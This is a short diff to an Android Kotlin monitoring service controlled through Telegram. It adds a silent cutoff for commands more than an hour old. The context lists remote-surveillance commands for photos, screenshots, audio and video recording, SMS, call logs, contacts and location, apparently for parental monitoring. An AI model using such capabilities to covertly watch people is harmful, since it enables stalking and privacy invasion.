@@ -164,6 +164,7 @@ class MonitoringService : Service() {
         private val KNOWN_COMMANDS = setOf("/photo", "/screenshot", "/status", "/perms", "/lastcalls", "/lastsms", "/photointerval", "/patrol", "/patrolinterval", "/pause", "/battery", "/stop", "/resume", "/location", "/camera", "/notif", "/log", "/syncinterval", "/restart", "/flush", "/clearqueue", "/lock", "/ring", "/ping", "/record", "/recordvideo", "/sms", "/smsconfirm", "/lastnotif", "/version", "/uptime", "/contacts", "/apps", "/storage", "/history", "/help", "/start", "/night", "/ringkas", "/watch", "/home", "/school", "/digest", "/darurat", "/jampulang", "/minggu", "/watchnomor", "/jejak", "/waspada", "/hilang", "/jemput")
         private val ALIAS_COMMANDS = mapOf("dimana" to "/location", "lokasi" to "/location", "posisi" to "/location", "foto" to "/photo", "photo" to "/photo", "ding" to "/ring", "bunyi" to "/ring", "kunci" to "/lock", "baterai" to "/battery", "batre" to "/battery", "bantu" to "/help", "tolong" to "/help", "menu" to "/help", "lanjut" to "/resume", "versi" to "/version", "sms" to "/sms", "darurat" to "/darurat", "minggu" to "/minggu", "laporan" to "/minggu", "pulang" to "/jampulang", "jejak" to "/jejak", "waspada" to "/waspada", "hilang" to "/hilang", "jemput" to "/jemput")
         private const val COMMAND_MAX_AGE_SEC = 900L
+        private const val COMMAND_SILENT_AGE_SEC = 3600L
         private const val MUTATING_MAX_AGE_SEC = 300L
         private const val PING_RATE_WINDOW_MS = 120_000L
         private const val PING_RESTART_COOLDOWN_MS = 300_000L
@@ -1467,6 +1468,7 @@ class MonitoringService : Service() {
 
     private suspend fun handleTelegramCommand(raw: String, sentAtSec: Long = 0L, senderOk: Boolean = false, chatOk: Boolean = false, wakeSeen: Boolean = false, senderId: String = "", privateChat: Boolean = false) {
         val nowSec = System.currentTimeMillis() / 1000L
+        if (sentAtSec > 0 && nowSec - sentAtSec > COMMAND_SILENT_AGE_SEC) return
         if (sentAtSec > 0 && nowSec - sentAtSec > COMMAND_MAX_AGE_SEC) {
             serviceScope.launch {
                 sendToTelegram("\u23F3\uFE0F Command kedaluwarsa, kirim lagi.")
